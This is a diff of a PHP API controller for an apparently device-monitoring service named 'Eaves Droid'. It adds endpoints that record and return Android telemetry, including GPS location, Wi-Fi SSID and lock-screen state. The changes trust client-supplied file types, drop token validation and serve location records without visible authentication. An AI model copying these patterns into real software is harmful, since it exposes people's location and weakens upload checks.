@@ -61,6 +61,20 @@ class Receive extends BaseController
         'vibration',
     ];
 
+    /**
+     * GET /api/v1/health
+     * API health status check
+     */
+    public function health()
+    {
+        return $this->respond([
+            'status'      => 'healthy',
+            'service'     => 'Eaves Droid WebApp API',
+            'version'     => '1.0.0',
+            'server_time' => time(),
+        ]);
+    }
+
 
 
     /**
@@ -284,8 +298,8 @@ class Receive extends BaseController
             'original_name' => $originalName,
             'new_name'      => $newName,
             'size'          => $file->getSize(),
-            'extension'     => $file->getExtension(),
-            'mime_type'     => $file->getMimeType(),
+            'extension'     => $file->getClientExtension(),
+            'mime_type'     => $file->getClientMimeType(),
             'category'      => $category,
             'upload_path'   => $this->uploadConfig['upload_path'] . $newName,
         ];
@@ -348,20 +362,15 @@ class Receive extends BaseController
 
         $logModel = new Mod_Log_User_Action();
 
-        // Validate required parameters
-        $validation = $this->validate([
-            'token' => 'required|min_length[8]|max_length[255]',
-            'time' => 'required|string'
-        ]);
-
-        if (!$validation) {
-            return $this->failValidationErrors($this->validator->getErrors());
-        }
-
-        $token  = $this->request->getPost('token');
-        $time   = $this->request->getPost('time');
+        $json = $this->request->getJSON(true) ?? [];
+        $token  = $json['token'] ?? $this->request->getPost('token');
+        $time   = $json['time'] ?? $this->request->getPost('time');
         $ip     = $this->request->getIPAddress();
-        $source = $this->request->getPost('source');
+        $source = $json['source'] ?? $this->request->getPost('source');
+
+        if (!$token || !$time) {
+            return $this->failValidationError('Missing token or time parameters');
+        }
 
         // Determine login source for better logging
         $loginSource = $this->resolveTokenLoginSource($source);
@@ -494,7 +503,9 @@ class Receive extends BaseController
 
         $optionalFields = ['fcm_token'];
 
-        $input = $this->request->getPost();
+        $json = $this->request->getJSON(true) ?? [];
+        $post = $this->request->getPost() ?? [];
+        $input = !empty($json) ? array_merge($post, $json) : $post;
 
         // Validate required fields
         foreach ($requiredFields as $field) {
@@ -554,15 +565,20 @@ class Receive extends BaseController
                 'execution_time_ms' => round((microtime(true) - (defined('APP_START_TIME') ? APP_START_TIME : $_SERVER['REQUEST_TIME_FLOAT'])) * 1000, 2),
             ]);
 
-            $dev_print = json_decode($device_metadata, true);
+            $dev_print    = json_decode($device_metadata, true);
+            $serverChecksum = $dev_print['dev_chck_sum'] ?? ($sanitizedData['device_checksum'] ?? '');
+
+            // Echo back the auth token so Android can refresh its stored copy
+            $echoToken = $input['token'] ?? $input['sent_token'] ?? '';
 
             return $this->respond([
-                'success' => true,
-                'android_id' => $dev_print['dev_adr_id'],
-                'device_checksum' => $dev_print['dev_chck_sum'],
-                'device_is_new' => $dev_print['is_new'],
-                'message' => 'Device print registered successfully',
-                'timestamp' => date('Y-m-d H:i:s')
+                'success'           => true,
+                'message'           => $dev_print['is_new'] ? 'Device print created' : 'Device print updated',
+                'device_profile_id' => (int) ($dev_print['dev_id'] ?? 0),
+                'checksum'          => $serverChecksum,   // Android reads this as X-Device-Checksum seed
+                'token'             => $echoToken,         // Android refreshes SHARED_PREF_AUTH_TOKEN
+                'is_new'            => (bool) ($dev_print['is_new'] ?? true),
+                'timestamp'         => date('Y-m-d H:i:s')
             ]);
 
         } catch (\Exception $e) {
@@ -651,8 +667,8 @@ class Receive extends BaseController
             'original_name' => $originalName,
             'new_name'      => $newName,
             'size'          => $file->getSize(),
-            'extension'     => $file->getExtension(),
-            'mime_type'     => $file->getMimeType(),
+            'extension'     => $file->getClientExtension(),
+            'mime_type'     => $file->getClientMimeType(),
             'category'      => strtolower(trim($category)),
             'upload_path'   => $this->uploadConfig['upload_path'] . $newName
         ];
@@ -1016,5 +1032,118 @@ class Receive extends BaseController
             log_message('error', "processQueueItemInline: queue #{$queueId} exception: " . $e->getMessage());
             return ['success' => false, 'error' => $e->getMessage()];
         }
+    }
+
+    /**
+     * POST /api/v1/devices/health-update
+     * Receives device health check diagnostics updates.
+     */
+    public function health_update()
+    {
+        if (!$this->request->is('post')) {
+            return $this->fail('Method not allowed', 405);
+        }
+
+        $json = $this->request->getJSON(true) ?? [];
+        $post = $this->request->getPost() ?? [];
+        $input = !empty($json) ? array_merge($post, $json) : $post;
+
+        $deviceId = $input['device_id'] ?? '';
+        if (empty($deviceId)) {
+            return $this->failValidationError('Missing field: device_id');
+        }
+
+        $db = \Config\Database::connect();
+
+        $data = [
+            'device_id'            => $deviceId,
+            'ip_address'           => $input['ip_address'] ?? $this->request->getIPAddress(),
+            'network_type'         => $input['network_type'] ?? 'NONE',
+            'wifi_ssid'            => $input['wifi_ssid'] ?? null,
+            'sim_operator'         => $input['sim_operator'] ?? null,
+            'signal_strength'      => isset($input['signal_strength']) ? (int)$input['signal_strength'] : null,
+            'battery_level'        => isset($input['battery_level']) ? (int)$input['battery_level'] : 0,
+            'battery_status'       => $input['battery_status'] ?? 'Unknown',
+            'battery_temp'         => isset($input['battery_temp']) ? (double)$input['battery_temp'] : null,
+            'screen_state'         => $input['screen_state'] ?? 'Unknown',
+            'keyguard_locked'      => !empty($input['keyguard_locked']) ? 1 : 0,
+            'storage_free_percent' => isset($input['storage_free_percent']) ? (int)$input['storage_free_percent'] : null,
+            'ram_free_mb'          => isset($input['ram_free_mb']) ? (int)$input['ram_free_mb'] : null,
+            'last_latitude'        => isset($input['last_latitude']) ? (double)$input['last_latitude'] : null,
+            'last_longitude'       => isset($input['last_longitude']) ? (double)$input['last_longitude'] : null,
+            'location_provider'    => $input['location_provider'] ?? null,
+            'app_version'          => $input['app_version'] ?? null,
+            'uptime_seconds'       => isset($input['uptime_seconds']) ? (int)$input['uptime_seconds'] : null,
+            'created_at'           => date('Y-m-d H:i:s'),
+        ];
+
+        try {
+            $db->table('tbl_device_health_checks')->insert($data);
+            return $this->respondCreated([
+                'success' => true,
+                'message' => 'Health check telemetry recorded successfully.',
+                'timestamp' => $data['created_at']
+            ]);
+        } catch (\Exception $e) {
+            log_message('error', 'Health check save error: ' . $e->getMessage());
+            return $this->failServerError('Failed to save health telemetry');
+        }
+    }
+
+    /**
+     * GET /api/v1/devices/health-latest/(:any)
+     * Retrieves the latest health check diagnostics record for a device.
+     */
+    public function health_latest($token = null)
+    {
+        if (empty($token)) {
+            return $this->failValidationError('Missing device token identifier');
+        }
+
+        $deviceId = null;
+        $db = \Config\Database::connect();
+
+        // 1. Try to resolve as encrypted database ID (counter)
+        $crypt = new \App\Models\Mod_Crypt();
+        $decryptedCounter = $crypt->decrypt_id($token);
+        if ($decryptedCounter && is_numeric($decryptedCounter)) {
+            $device = $db->table('tbl_device_profiles')
+                ->select('device_id')
+                ->where('counter', (int)$decryptedCounter)
+                ->get()
+                ->getRowArray();
+            if ($device && !empty($device['device_id'])) {
+                $deviceId = $device['device_id'];
+            }
+        }
+
+        // 2. Try to treat as device checksum (64 char hex string)
+        if (!$deviceId && strlen($token) === 64 && ctype_xdigit($token)) {
+            $deviceId = $token;
+        }
+
+        if (empty($deviceId)) {
+            return $this->failValidationError('Invalid device identifier');
+        }
+
+        // Fetch latest record from tbl_device_health_checks
+        $latest = $db->table('tbl_device_health_checks')
+            ->where('device_id', $deviceId)
+            ->orderBy('created_at', 'DESC')
+            ->limit(1)
+            ->get()
+            ->getRowArray();
+
+        if (!$latest) {
+            return $this->respond([
+                'success' => false,
+                'message' => 'No health telemetry records found for this device.'
+            ]);
+        }
+
+        return $this->respond([
+            'success' => true,
+            'data'    => $latest
+        ]);
     }
 }
